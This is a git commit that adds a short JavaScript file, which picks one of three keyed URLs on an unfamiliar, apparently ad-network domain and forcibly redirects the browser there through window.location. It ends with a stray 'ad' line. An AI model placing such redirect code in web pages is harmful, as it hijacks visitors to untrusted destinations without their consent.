7eb0924facc5fd3569b78a5a022a4b9c8436d94a
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-11-10 17:46:32 +0800

    Create joss5c.js

---
+++ joss5c.js
@@ -0,0 +1,13 @@
+
+var dataUrl = [
+  
+  'https://arousedimitateplane.com/tykpbwuirx?key=2bd2cc016f846e31eba9c90b01a4ed2d',
+  'https://arousedimitateplane.com/hd8pzzdktj?key=ed4ea6cf3942fb996e79906e1c59a64d',
+  'https://arousedimitateplane.com/p1e7i05y?key=70d51c7afe95955a0dc6c6982c478b84'
+  
+  
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
+ad
